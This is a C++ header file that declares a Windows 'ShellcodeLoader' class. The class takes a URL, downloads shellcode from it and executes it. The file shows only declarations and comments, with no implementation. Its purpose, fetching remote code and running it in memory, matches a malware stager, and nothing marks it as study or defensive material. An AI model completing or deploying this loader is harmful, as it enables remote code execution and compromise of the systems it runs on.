#ifndef SHELLCODELOADER_H
#define SHELLCODELOADER_H

#include <windows.h>
#include <string>
#include <vector>

class ShellcodeLoader {
public:
    // Constructor to initialize with the shellcode URL
    ShellcodeLoader(const std::string& url);

    // Method to download the shellcode from the given URL
    bool downloadShellcode();

    // Method to execute the downloaded shellcode
    bool executeShellcode();

private:
    std::string shellcodeURL;           // URL of the shellcode to download
    std::vector<BYTE> shellcode;        // Vector to hold the downloaded shellcode
    DWORD shellcodeSize;                // Size of the shellcode
};

#endif
